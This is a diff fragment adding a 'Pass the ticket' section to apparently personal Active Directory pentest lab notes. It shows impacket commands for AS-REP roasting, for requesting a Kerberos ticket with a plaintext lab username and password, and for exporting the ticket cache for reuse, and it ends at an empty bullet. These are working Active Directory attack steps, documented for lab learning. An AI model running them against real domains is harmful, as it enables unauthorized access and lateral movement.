@@ -333,6 +333,22 @@ impacket-GetNPUsers cs.org/ -usersfile valid_ad_username -dc-ip 192.168.232.129 
 
 ---------------
 
+### Pass the ticket
 
+----------------
 
+- Request a ticket for ServicePrincipal with-:
 
+```bash
+impacket-getTGT -dc-ip 192.168.232.129 'cs.org/stafani.ferdinanda:ncc1701' -debug
+```
+
+<img width="954" height="211" alt="image" src="https://github.com/user-attachments/assets/b45cf6d0-056b-423a-aa2c-4cd849a02d0e" />
+
+- Setting the ticket `.ccache` for easy login-:
+
+```bash
+export KRB5CCNAME=/home/sensei/AD/lab/stafani.ferdinanda.ccache
+```
+
+- 
